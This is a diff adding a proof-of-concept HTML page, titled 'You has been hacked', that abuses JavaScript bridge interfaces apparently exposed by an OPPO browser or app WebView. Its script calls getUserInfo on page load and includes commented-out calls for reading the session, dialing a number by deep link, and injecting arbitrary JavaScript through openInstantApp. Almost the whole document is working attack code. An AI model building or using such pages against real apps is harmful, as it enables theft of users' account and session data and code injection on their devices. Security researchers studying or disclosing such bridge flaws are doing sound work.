@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+</head>
+
+<body>
+    <div id="content" style="margin-left: 440">You has been hacked</div>
+    <script>
+
+        function gotoWhiteUrl(){
+            top.document.href = "https://www.baidu.com";
+        }
+
+        //-----------------------以下是WebPageJsInterface对象的接口调用示例--------------------------------
+        function getAssistantInfo() {
+            alert(window.OppoWebPage.getAssistantInfo());
+        }
+
+        function openDeepLink(){
+            window.OppoWebPage.openDeepLink("wtai://wp/mc;10086");
+        }
+
+        //任意js代码执行
+        function openInstantApp(){
+            window.OppoWebPage.openInstantApp("alert('xxxx');//","null");
+        }
+
+
+        function getKKUAV3(){
+            window.OppoFlow.getKKUAV3();
+        }
+
+        function getSession(){
+            window.OppoFlow.getSession();
+        }
+
+        function getUserInfo(){
+            window.OppoFlow.getUserInfo();
+        }
+
+        function getUserInfoImmediately(){
+            window.OppoFlow.getUserInfoImmediately();
+        }
+
+
+        // getAssistantInfo();
+        // openDeepLink();
+        // openInstantApp();
+        // getKKUAV3();
+        // getSession();
+        getUserInfo();
+
+
+        // setInterval(gotoWhiteUrl, 5);//5毫秒
+        // setTimeout(test, 500);//延迟3秒执行
+    </script>
+</body>
